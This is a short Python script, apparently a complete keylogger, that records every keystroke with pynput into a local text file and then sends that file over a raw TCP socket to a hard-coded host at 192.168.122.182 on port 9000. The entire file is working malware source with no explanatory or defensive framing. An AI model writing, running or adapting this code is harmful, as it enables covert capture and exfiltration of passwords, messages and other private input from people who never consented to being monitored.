from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write('{}\n'.format(key))
    except Exception as e:
        print("Error occurred while writing to file:", str(e))

def transmit_file():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('192.168.122.182', 9000)
    try:
        client_socket.connect(server_address)
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
            client_socket.sendall(data)
    except Exception as e:
        print("Error occurred while transmitting file:", str(e))
    finally:
        client_socket.close()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
transmit_file()